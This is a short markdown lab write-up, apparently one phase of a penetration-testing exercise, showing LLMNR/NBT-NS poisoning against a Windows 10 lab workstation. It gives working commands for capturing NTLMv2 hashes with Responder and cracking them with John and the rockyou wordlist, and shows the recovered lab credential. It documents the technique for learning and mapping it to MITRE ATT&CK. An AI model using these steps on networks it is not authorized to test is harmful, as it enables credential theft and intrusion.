# Phase 1 — LLMNR/NBT-NS Poisoning

## Overview
LLMNR (Link-Local Multicast Name Resolution) is enabled by default on Windows.
When a DNS lookup fails, Windows broadcasts an LLMNR query to the entire subnet.
An attacker listening on the same network can respond to this broadcast,
tricking the victim into sending NTLMv2 credentials.

## MITRE ATT&CK
| Field | Value |
|---|---|
| Tactic | Credential Access |
| Technique | T1557.001 — LLMNR/NBT-NS Poisoning |

## Environment
| Component | Details |
|---|---|
| Attacker | Kali Linux (10.0.0.99) |
| Victim | WORKSTATION01 — Windows 10 Pro (10.0.0.30) |
| Tool | Responder |

## Attack Steps

### 1. Start Responder on Kali
```bash
sudo responder -I eth0 -dw
```

### 2. Trigger LLMNR broadcast from WORKSTATION01
Open File Explorer and navigate to a non-existent share:
```
\\nonexistent-server
```
Windows fails DNS → broadcasts LLMNR → Responder intercepts

### 3. Capture NTLMv2 Hash
Responder captures the hash automatically:
```
[SMB] NTLMv2 Hash captured from 10.0.0.30
```

### 4. Crack the Hash
```bash
john /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.0.30.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt
```
**Result:** testuser:Password123

